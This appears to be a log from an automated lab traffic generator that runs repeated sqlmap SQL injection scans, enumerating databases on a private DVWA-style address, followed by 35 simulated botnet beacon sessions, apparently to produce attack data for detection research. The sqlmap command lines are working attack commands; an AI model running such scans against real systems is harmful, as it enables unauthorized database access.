+[webattack_gcp_024] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_024] Logged. Duration: 11.46s
+[webattack_gcp_025] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_025] Logged. Duration: 11.43s
+[webattack_gcp_026] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_026] Logged. Duration: 11.47s
+[webattack_gcp_027] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_027] Logged. Duration: 11.45s
+[webattack_gcp_028] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_028] Logged. Duration: 11.47s
+[webattack_gcp_029] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_029] Logged. Duration: 11.42s
+[webattack_gcp_030] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_030] Logged. Duration: 11.46s
+[webattack_gcp_031] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_031] Logged. Duration: 11.46s
+[webattack_gcp_032] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_032] Logged. Duration: 11.46s
+[webattack_gcp_033] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_033] Logged. Duration: 11.47s
+[webattack_gcp_034] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_034] Logged. Duration: 11.44s
+[webattack_gcp_035] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_035] Logged. Duration: 11.44s
+[2026-09-05T15:55:38.994670] === Finished web_attack.py. Sleeping 60s before next category ===
+[2026-09-05T15:56:38.995064] === Flushing iptables before botnet_beacon_attack.py ===
+[2026-09-05T15:56:39.273801] Victim iptables flushed + management SSH rule re-added.
+[2026-09-05T15:56:39.273915] === Starting botnet_beacon_attack.py with 35 sessions ===
+[botnet_beacon_gcp_001] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_001] Logged. Duration: 56.12s
+[botnet_beacon_gcp_002] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_002] Logged. Duration: 56.11s
+[botnet_beacon_gcp_003] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_003] Logged. Duration: 60.07s
+[botnet_beacon_gcp_004] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_004] Logged. Duration: 56.12s
+[botnet_beacon_gcp_005] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_005] Logged. Duration: 56.12s
+[botnet_beacon_gcp_006] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_006] Logged. Duration: 60.07s
+[botnet_beacon_gcp_007] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_007] Logged. Duration: 56.12s
+[botnet_beacon_gcp_008] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_008] Logged. Duration: 56.12s
+[botnet_beacon_gcp_009] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_009] Logged. Duration: 60.07s
+[botnet_beacon_gcp_010] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_010] Logged. Duration: 56.13s
+[botnet_beacon_gcp_011] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_011] Logged. Duration: 56.12s
+[botnet_beacon_gcp_012] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_012] Logged. Duration: 60.07s
+[botnet_beacon_gcp_013] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_013] Logged. Duration: 56.12s
+[botnet_beacon_gcp_014] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_014] Logged. Duration: 56.12s
+[botnet_beacon_gcp_015] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_015] Logged. Duration: 60.07s
+[botnet_beacon_gcp_016] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_016] Logged. Duration: 56.12s
+[botnet_beacon_gcp_017] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_017] Logged. Duration: 56.12s
+[botnet_beacon_gcp_018] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_018] Logged. Duration: 60.07s
+[botnet_beacon_gcp_019] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_019] Logged. Duration: 56.12s
+[botnet_beacon_gcp_020] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_020] Logged. Duration: 56.11s
+[botnet_beacon_gcp_021] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_021] Logged. Duration: 60.08s
+[botnet_beacon_gcp_022] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_022] Logged. Duration: 56.11s
+[botnet_beacon_gcp_023] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_023] Logged. Duration: 56.12s
+[botnet_beacon_gcp_024] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_024] Logged. Duration: 60.07s
+[botnet_beacon_gcp_025] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_025] Logged. Duration: 56.12s
+[botnet_beacon_gcp_026] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_026] Logged. Duration: 56.12s
+[botnet_beacon_gcp_027] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_027] Logged. Duration: 60.07s
+[botnet_beacon_gcp_028] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_028] Logged. Duration: 56.12s
+[botnet_beacon_gcp_029] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_029] Logged. Duration: 56.12s
+[botnet_beacon_gcp_030] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_030] Logged. Duration: 60.07s
+[botnet_beacon_gcp_031] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_031] Logged. Duration: 56.11s
+[botnet_beacon_gcp_032] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_032] Logged. Duration: 56.12s
+[botnet_beacon_gcp_033] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_gcp_033] Logged. Duration: 60.08s
+[botnet_beacon_gcp_034] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_034] Logged. Duration: 56.12s
+[botnet_beacon_gcp_035] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_gcp_035] Logged. Duration: 56.12s
+[2026-09-05T16:47:37.029729] === Finished botnet_beacon_attack.py. Sleeping 60s before next category ===
+[2026-09-05T16:48:37.030222] === ALL CATEGORIES COMPLETE ===
